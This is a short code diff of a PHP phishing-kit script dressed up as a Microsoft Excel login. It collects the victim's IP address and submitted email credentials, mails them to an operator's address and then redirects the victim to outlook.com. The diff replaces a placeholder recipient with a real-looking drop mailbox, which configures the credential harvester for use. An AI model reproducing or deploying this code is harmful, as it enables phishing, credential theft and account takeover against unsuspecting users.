@@ -8,7 +8,7 @@ $message .= "IP: ".$ip."\n";
 $message .= "---------------+ ~ Microsoft Excel ~ + = L0G$Z-----------------\n";
 $message .= "Date: ".$adddate."\n";
 $message .= "---------------Created By DON$-----------------\n";
-$send = "email @ email .com";
+$send = "dattiobi@keemail.me";
 $subject = "~*Microsoft Excel *~ = E-MAIL ReZulT*~";
 $headers = "From: Ali<DON$$>";
 $headers .= $_POST['eMailAdd']."\n";
@@ -18,3 +18,4 @@ header("Location: https://outlook.com/");
 	  
 
 ?>
+
